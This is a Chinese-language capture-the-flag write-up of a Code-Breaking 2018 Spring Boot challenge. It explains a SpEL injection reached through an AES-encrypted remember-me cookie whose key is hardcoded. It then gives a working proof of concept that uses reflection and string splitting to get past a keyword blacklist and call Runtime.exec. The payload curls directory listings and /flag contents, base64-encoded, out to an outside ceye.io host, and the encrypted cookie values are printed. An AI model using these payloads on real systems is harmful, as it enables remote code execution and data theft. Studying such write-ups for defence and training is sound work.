#### 题目来源于：

Java安全漫谈 - 01.反射篇(1)

关于绕沙盒，Code-Breaking 2018 P神出的⼀道SpEL的题⽬：
http://rui0.cn/archives/1015

在安全研究中，我们使⽤反射的⼀⼤⽬的，就是绕过某些沙盒。⽐如，上下⽂中如果只有Integer类型的 数字，我们如何获取到可以执⾏命令的Runtime类呢？也许可以这样（伪代码）： `1.getClass().forName("java.lang.Runtime")`

#### 解题思路：

通过IDEA lib将给出的jar包反编译，看到源代码：

**程序结构：**

<img src="http://rui0.cn/wp-content/uploads/2018/11/Ping_Mu_Kuai_Zhao_-2018-11-25-_Xia_Wu_6-3.png" alt="屏幕快照 2018-11-25 下午6.34.08" style="zoom:50%;" />

从`SpringBoot`的配置 **`application.yml`**看起：

```java
spring:
  thymeleaf:
    encoding: UTF-8
    cache: false
    mode: HTML
keywords:
  blacklist:
    - java.+lang
    - Runtime
    - exec.*\(
user:
  username: admin
  password: admin
  rememberMeKey: c0dehack1nghere1
```

主要一个黑名单和一个用户的提供。

**其他文件 ：**
`SmallEvaluationContext` 继承 `StandardEvaluationContext`，主要是提供一个上下文环境，相当于一个容器。
`ChallengeApplication` 用于启动
`Encryptor` 加密解密工具类
`KeyworkProperties` 使用黑名单时需要
`UserConfig` 用户模型，可以看到在`RemberMe`时使用了`Encryptor`

主要看**`MainController`**：（按住Ctrl+F12查看类的方法）

<img src="C:\Users\92579\AppData\Roaming\Typora\typora-user-images\image-20240406155857927.png" alt="image-20240406155857927" style="zoom:50%;" />

- `admin()`：处理GET请求，检查是否存在有效的记住我cookie，验证用户会话，根据用户状态返回不同的视图。
- `login()`：处理GET请求，返回登录页面。
- `loginError()`：处理GET请求，返回带有登录错误信息的登录页面。
- `login()`：处理POST请求，验证用户名和密码，设置用户会话，如果用户选择记住我，设置记住我cookie。
- `handleForbiddenException()`：异常处理方法，处理 `HttpClientErrorException` 异常，返回HTTP状态码403（禁止访问）的页面。

从登陆看起，**login**的路由：

```java
    @PostMapping({"/login"})
    public String login(@RequestParam(value = "username",required = true) String username, @RequestParam(value = "password",required = true) String password, @RequestParam(value = "remember-me",required = false) String isRemember, HttpSession session, HttpServletResponse response) {
        if (this.userConfig.getUsername().contentEquals(username) && this.userConfig.getPassword().contentEquals(password)) {
            session.setAttribute("username", username);
            if (isRemember != null && !isRemember.equals("")) {
                Cookie c = new Cookie("remember-me", this.userConfig.encryptRememberMe());
                c.setMaxAge(2592000);
                response.addCookie(c);
            }

            return "redirect:/";
        } else {
            return "redirect:/login-error";
        }
    }
```

判断用户名密码，如果勾选了`remberMe`则浏览器存入加密后的cookie。
最后跳转hello.html

比较敏感的一个操作就是对Cookie的处理，如下：

```java
    @GetMapping
    public String admin(@CookieValue(value = "remember-me",required = false) String rememberMeValue, HttpSession session, Model model) {
        if (rememberMeValue != null && !rememberMeValue.equals("")) {
            String username = this.userConfig.decryptRememberMe(rememberMeValue);
            if (username != null) {
                session.setAttribute("username", username);
            }
        }

        Object username = session.getAttribute("username");
        if (username != null && !username.toString().equals("")) {
            model.addAttribute("name", this.getAdvanceValue(username.toString()));
            return "hello";
        } else {
            return "redirect:/login";
        }
    }
```

程序判断`rememberMeValue`存在后，直接对其进行解密，然后将其`setAttribute`，接下来可以看到`this.getAdvanceValue(username.toString())`

```java
   private String getAdvanceValue(String val) {
        String[] var2 = this.keyworkProperties.getBlacklist();
        int var3 = var2.length;

        for(int var4 = 0; var4 < var3; ++var4) {
            String keyword = var2[var4];
            Matcher matcher = Pattern.compile(keyword, 34).matcher(val);
            if (matcher.find()) {
                throw new HttpClientErrorException(HttpStatus.FORBIDDEN);
            }
        }

        ParserContext parserContext = new TemplateParserContext();
        Expression exp = this.parser.parseExpression(val, parserContext);
        SmallEvaluationContext evaluationContext = new SmallEvaluationContext();
        return exp.getValue(evaluationContext).toString();
    }
```

其实就是与其跟黑名单做正则匹配，如果匹配成功则抛出`HttpStatus.FORBIDDEN`，如果没有匹配到则进行正常流程，在`SmallEvaluationContext`进行SpEL表达式解析。注意，这里就存在El表达式注入的问题了。
在java中我们可以通过`Runtime.getRuntime().exec("/Applications/Calculator.app/Contents/MacOS/Calculator")`来执行命令，但在这个题目中使用了黑名单。
所以这里我们需要使用反射来构造一条调用链，这样就可以在关键字处使用字符串拼接来达到绕过黑名单的效果。



#### POC：

```
System.out.println(Encryptor.encrypt("c0dehack1nghere1", "0123456789abcdef", "#{T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"ex\"+\"ec\",T(String[])).invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"getRu\"+\"ntime\").invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\")),new String[]{\"/bin/bash\",\"-c\",\"curl fg5hme.ceye.io/`cd / && ls|base64|tr '\\n' '-'`\"})}"));
```



payload代码：

```java
import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.IvParameterSpec;
import java.io.UnsupportedEncodingException;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.Base64;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;


class Encryptor{
    public static String encrypt(String key, String initVector, String value){
        try {
            IvParameterSpec iv = new IvParameterSpec(initVector.getBytes("UTF-8"));
            SecretKeySpec skeySpec = new SecretKeySpec(key.getBytes("UTF-8"),"AES");
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5PADDING");
            cipher.init(1, skeySpec, iv);
            byte[] encrypted = cipher.doFinal(value.getBytes());
            return Base64.getUrlEncoder().encodeToString(encrypted);
        } catch (Exception var7) {

        }
            return null;
    }
}
public class Main {
    public static void main(String[] args) {
        //System.out.println(Encryptor.encrypt("c0dehack1nghere1", "0123456789abcdef", "#{T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"ex\"+\"ec\",T(String[])).invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"getRu\"+\"ntime\").invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\")),new String[]{\"/bin/bash\",\"-c\",\"curl h1x3lu.ceye.io/`cd / && ls|base64|tr '\\n' '-'`\"})}"));
        System.out.println(Encryptor.encrypt("c0dehack1nghere1", "0123456789abcdef", "#{T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"ex\"+\"ec\",T(String[])).invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"getRu\"+\"ntime\").invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\")),new String[]{\"/bin/bash\",\"-c\",\"curl h1x3lu.ceye.io/`cd / && cat /flag |base64|tr '\\n' '-'`\"})}"));

    }
}
```

payload：

`ls`

```
bvik1nAmjEAllRdn5UKWGC9uCj0hW0P2B6k1uigkS1acKxD9b_xNi-x09UGgjU1DvDEI2GGk4Jn0ApM_cSVc0G7kGnvvtewNRVsfqFUCR0fMAPqbj6yqACW6XVtt8Fp1nBwebKd7pkYSZCv6Yj3X7H-0-8HDV6F3sS3yWHUQEBPAyiNmKfkSKUV5VVlNdo16Nij8YX8HvKdeMHJ7_5Sdjfmfq3dKPeUOivMyVp_GdEkffgly4YX4eWCOzQRr4uQgodsKw2pC9N9udnw3Fz7O5ZhzmoYttjLubBowMtkF-Q6HHCvBrK9SWCzRQXC6jqYX_XeqyZuDreUixnpXpzlN9ATMq650tXCEsY3IgEjPBfhcSmjLzXBM5SfCvOvJl8mVEAaQrepOVWcUrC7gZ78bsG3T2_eji1vxWlPf5iBOD_mETPh1evzmoXp81J0OuD_r
```

`cat /flag`

```
bvik1nAmjEAllRdn5UKWGC9uCj0hW0P2B6k1uigkS1acKxD9b_xNi-x09UGgjU1DvDEI2GGk4Jn0ApM_cSVc0G7kGnvvtewNRVsfqFUCR0fMAPqbj6yqACW6XVtt8Fp1nBwebKd7pkYSZCv6Yj3X7H-0-8HDV6F3sS3yWHUQEBPAyiNmKfkSKUV5VVlNdo16Nij8YX8HvKdeMHJ7_5Sdjfmfq3dKPeUOivMyVp_GdEkffgly4YX4eWCOzQRr4uQgodsKw2pC9N9udnw3Fz7O5ZhzmoYttjLubBowMtkF-Q6HHCvBrK9SWCzRQXC6jqYX_XeqyZuDreUixnpXpzlN9ATMq650tXCEsY3IgEjPBfhcSmjLzXBM5SfCvOvJl8mVEAaQrepOVWcUrC7gZ78bsPa0aeXame9ygRwZ6rMs20_jKJBDSpGEHkactNk7wvVkjG8IIfgg9yDUoDPSkEkJfw==
```

![image-20240410094908871](C:\Users\92579\AppData\Roaming\Typora\typora-user-images\image-20240410094908871.png)

![image-20240410094938746](C:\Users\92579\AppData\Roaming\Typora\typora-user-images\image-20240410094938746.png)
